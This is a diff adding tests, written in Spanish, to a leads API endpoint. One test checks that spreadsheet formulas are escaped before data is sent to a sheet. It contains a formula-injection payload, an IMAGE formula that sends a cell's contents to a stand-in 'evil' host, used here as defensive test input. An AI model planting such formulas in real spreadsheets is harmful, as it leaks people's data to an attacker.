@@ -67,6 +67,22 @@ describe("POST /api/leads", () => {
     expect(fetchMock).not.toHaveBeenCalled();
   });
 
+  it("responde 400, no 500, con una campaña heredada del prototipo", async () => {
+    const res = await POST(request({ ...lead, campaign: "constructor" }));
+    expect(res.status).toBe(400);
+  });
+
+  it("neutraliza fórmulas antes de enviarlas a la hoja", async () => {
+    fetchMock.mockResolvedValue(Response.json({ ok: true }));
+    await POST(
+      request({ ...lead, name: '=IMAGE("https://evil/?"&C2)', utm: { utm_source: "@x" } }),
+    );
+    const sent = JSON.parse(fetchMock.mock.calls[0][1].body);
+    expect(sent.name).toBe(`'=IMAGE("https://evil/?"&C2)`);
+    expect(sent.utm_source).toBe("'@x");
+    expect(sent.phone).toBe("0991234567");
+  });
+
   it("responde 400 con JSON inválido", async () => {
     const res = await POST(request("{no es json"));
     expect(res.status).toBe(400);
